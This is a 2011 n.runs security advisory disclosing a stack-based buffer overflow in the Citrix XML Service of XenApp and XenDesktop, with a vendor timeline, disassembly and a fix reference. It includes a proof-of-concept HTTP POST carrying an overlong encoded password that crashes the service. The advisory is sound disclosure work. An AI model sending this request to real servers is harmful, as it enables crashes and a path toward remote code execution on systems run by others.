@@ -1,0 +1,142 @@
+n.runs AG
+http://www.nruns.com/                                 security(at)nruns.com
+n.runs-SA-2011.001
+28-Jul-2011
+___________________________________________________________________________
+Vendor:         Citrix, http://www.citrix.com
+Affected Products:      XenApp and XenDesktop
+Affected Version:       See the Citrix security bulletin [2] for a list
+Vulnerability:          Stack-Based Buffer Overflow in Citrix XML Service
+Risk:                   HIGH
+___________________________________________________________________________
+
+Vendor communication:
+
+2011/04/26 Initial notification and request for PGP key
+2011/04/26 Received PGP key. Sent detailed vulnerability description
+2011/04/27 Confirmed receival / request for more version/patch information
+2011/05/31 Citrix requests exploit code to reproduce issue
+2011/06/02 n.runs provides Citrix with PoC exploit code
+2011/07/12 n.runs requests status update
+2011/07/15 Confirmation that issue was identified and patches are scheduled
+2011/07/27 Citrix publishes bulletin and hotfix
+___________________________________________________________________________
+
+Overview:
+
+A stack-based buffer overflow has been found in the Citrix XML Service of
+XenApp and XenDesktop which is installed on every server used for sharing
+applications. Successful exploitation allows arbitrary code execution on the
+server running the XML service.
+
+The issue can be exploited with network access to the XML service interface.
+But exploitation can also be performed with unauthenticated access to the
+Citrix web frontend which is exposed to the Internet in many cases.
+
+Description:
+
+The Citrix XML Service (ctxxmls.exe) is installed on every server used for
+sharing applications. This windows service listens by default on port 80 and
+can receive HTTP requests. Using HTTP POST requests with a URL starting with
+the path /scripts/ it is possible to send messages to so called "HTTP
+Extension DLLs" which consist of XML markup.
+
+The stack-based buffer overflow was identified in the wpnbr.dll extension
+DLL when parsing the <Password> element field. This element contains the
+obfuscated (CTX1 encoded) version of the password. If a plaintex password of
+more than 256 characters is provided this leads to the stack-based buffer
+overflow with the unicode version of the sent plaintext password in the
+current thread handler:
+
+.text:64F6053D
+.text:64F6053D loc_64F6053D:
+.text:64F6053D
+.text:64F6053D                 push    ebx
+.text:64F6053E                 push    edi
+.text:64F6053F                 push    esi
+.text:64F60540                 lea     ecx, [ebp+dst_buffer_struct]
+.text:64F60546                 call    sub_64F6A910
+.text:64F6054B                 lea     ecx, [ebp+dst_buffer_struct]
+.text:64F6054B                 ; [ecx + 3c] points to the stack buffer
+.text:64F6054B                 ; which gets overflowed.
+.text:64F60551                 push    ecx
+.text:64F60552                 lea     ecx, [ebp+var_46B8]
+.text:64F60558                 mov     byte ptr [ebp+var_4], 18h
+.text:64F6055C                 ; The call to parse_received_msg() leads
+.text:64F6055C                 ; to the overflow of the local stack
+.text:64F6055C                 ; buffer in this function!
+.text:64F6055C                 call    parse_received_msg
+.text:64F60561                 test    al, al
+.text:64F60563
+
+If the Citrix web frontend is configured to use the XML service for
+authentication purposes this can even be exploited without direct access to
+the XML service, but just by sending an appropriate HTTP request to the web
+frontend which allows an attacker to easily compromise an internal system
+running the XML service directly from the internet.
+
+Proof-of-Concept:
+
+The following sample request triggers the overflow when sent to the Citrix
+XML Service and causes the described crash:
+
+POST /scripts/wpnbr.dll HTTP/1.1
+Content-Type: text/xml
+Host: localhost:80
+Content-Length: 1338
+Connection: Keep-Alive
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE NFuseProtocol SYSTEM "NFuse.dtd">
+<NFuseProtocol version="5.1">
+<RequestValidateCredentials>
+<Credentials>
+<UserName>nruns</UserName>
+<Password
+encoding="ctx1">OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA
+OEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAAOEAA</Password>
+<Domain type="NT">TEST</Domain>
+</Credentials>
+</RequestValidateCredentials>
+</NFuseProtocol>
+
+n.runs successfully created a working exploit for the described
+vulnerability allowing arbitrary remote code execution on the machine
+running the XML service. However this exploit is not going to published.
+
+Impact:
+
+This vulnerability can be exploited by an attacker to gain remote code
+execution on a system running the Citrix XML service. It can either be
+exploited with direct network access to the XML service or even through the
+use of the Citrix web frontend, when the XML service is configured to be
+used for authentication.
+
+Solution:
+
+Citrix issued a hotfix for this issue which can be found at [2].
+
+___________________________________________________________________________
+
+Credit:
+Bug found and exploit developed by Moritz Jodeit of n.runs AG.
+___________________________________________________________________________
+
+References:
+[1] http://www.citrix.com/
+[2] http://support.citrix.com/article/CTX129430
+
+This Advisory and Upcoming Advisories:
+http://www.nruns.com/security_advisory.php
